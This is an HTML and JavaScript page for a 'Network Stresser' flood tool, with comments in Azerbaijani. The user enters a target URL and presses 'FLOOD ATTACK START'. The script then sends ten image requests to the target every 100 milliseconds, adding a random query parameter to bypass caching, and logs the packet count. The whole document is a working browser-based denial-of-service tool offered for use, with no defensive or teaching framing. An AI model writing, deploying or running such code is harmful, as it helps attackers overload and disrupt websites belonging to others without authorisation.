<div id="ddos-container" style="color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; text-align: center; background: #050000; border: 1px solid #300; border-radius: 10px;">
    <div class="radar-box" style="position: relative; width: 120px; height: 120px; margin: 0 auto 20px; border: 2px solid #ff0000; border-radius: 50%; overflow: hidden; box-shadow: 0 0 15px rgba(255,0,0,0.3);">
        <div class="radar-line" style="position: absolute; width: 100%; height: 100%; background: conic-gradient(from 0deg, rgba(255,0,0,0.4) 0%, transparent 50%); animation: radar-spin 2s linear infinite;"></div>
        <div style="position: absolute; top: 50%; left: 0; width: 100%; height: 1px; background: rgba(255,0,0,0.3);"></div>
        <div style="position: absolute; left: 50%; top: 0; width: 1px; height: 100%; background: rgba(255,0,0,0.3);"></div>
        <i class="fas fa-crosshairs" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 1.5rem; color: #ff0000; text-shadow: 0 0 5px red;"></i>
    </div>

    <h3 style="font-family: 'Syncopate', sans-serif; letter-spacing: 3px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0000;">NETWORK STRESSER v4.0</h3>
    
    <input type="text" id="target-url" placeholder="https://target-site.com" 
        style="width: 100%; padding: 15px; background: #000; border: 1px solid #ff0000; color: #ff0000; text-align: center; border-radius: 5px; outline: none; font-weight: bold;">
    
    <div style="display: flex; gap: 10px; margin-top: 15px;">
        <button onclick="startAttack()" id="at-btn" 
            style="flex: 2; padding: 18px; background: #ff0000; color: black; border: none; font-weight: 900; cursor: pointer; border-radius: 5px; text-transform: uppercase;">
            FLOOD ATTACK START
        </button>
        <button onclick="stopAttack()" 
            style="flex: 1; background: #300; color: #ff0000; border: 1px solid #ff0000; border-radius: 5px; font-weight: bold; cursor: pointer;">
            STOP
        </button>
    </div>

    <div style="display: flex; justify-content: space-around; margin-top: 15px; font-size: 12px; color: #888;">
        <span>PACKETS: <b id="p-count" style="color:#ff0000">0</b></span>
        <span>STATUS: <b id="s-status" style="color:#888">IDLE</b></span>
    </div>

    <div id="ddos-logs" style="height: 150px; overflow-y: auto; background: rgba(10,0,0,0.9); margin-top: 20px; padding: 15px; font-size: 10px; text-align: left; border: 1px solid #300; scroll-behavior: smooth; color: #ff5555;">
        [SYSTEM]: Module initialized. Ready for target...
    </div>
</div>

<style>
    @keyframes radar-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    .packet-log { border-left: 2px solid #ff0000; padding-left: 10px; margin-bottom: 3px; font-family: monospace; }
    .screen-shake { animation: shake 0.1s infinite; }
    @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -2px); } 100% { transform: translate(1px, -1px); } }
</style>

<script>
let attackActive = false;
let attackInterval;
let packetCount = 0;

function startAttack() {
    const target = document.getElementById('target-url').value;
    if(!target.startsWith('http')) {
        alert("Xəta: URL mütləq http:// və ya https:// ilə başlamalıdır!");
        return;
    }

    attackActive = true;
    packetCount = 0;
    document.getElementById('at-btn').innerText = "ATTACKING...";
    document.getElementById('at-btn').disabled = true;
    document.getElementById('s-status').innerText = "ACTIVE";
    document.getElementById('s-status').style.color = "#0f0";
    document.getElementById('ddos-container').classList.add('screen-shake');
    
    const logs = document.getElementById('ddos-logs');

    // Hücum Döngüsü
    attackInterval = setInterval(() => {
        if(!attackActive) return;

        // Eyni anda 10 sorğu göndər (Multi-thread imitasiyası)
        for(let i=0; i<10; i++) {
            const img = new Image();
            // Cache bypass üçün random parametr
            img.src = target + "/?attack=" + Math.random();
            packetCount++;
        }

        document.getElementById('p-count').innerText = packetCount;

        // Log hissəsi
        const log = document.createElement('div');
        log.className = 'packet-log';
        log.innerHTML = `[RAW_FLOOD]: Bulk ${packetCount} sent -> ${target.substring(0,25)}... <span style="color:#0f0">OK</span>`;
        logs.appendChild(log);
        
        // Logları təmizlə ki, proqram donmasın
        if (logs.childNodes.length > 30) logs.removeChild(logs.firstChild);
        logs.scrollTop = logs.scrollHeight;
    }, 100); 
}

function stopAttack() {
    attackActive = false;
    clearInterval(attackInterval);
    document.getElementById('at-btn').innerText = "FLOOD ATTACK START";
    document.getElementById('at-btn').disabled = false;
    document.getElementById('s-status').innerText = "STOPPED";
    document.getElementById('s-status').style.color = "#ff0000";
    document.getElementById('ddos-container').classList.remove('screen-shake');
    
    const log = document.createElement('div');
    log.innerHTML = `<span style="color:yellow">[SYSTEM]: Attack sequence terminated.</span>`;
    document.getElementById('ddos-logs').appendChild(log);
}
</script>
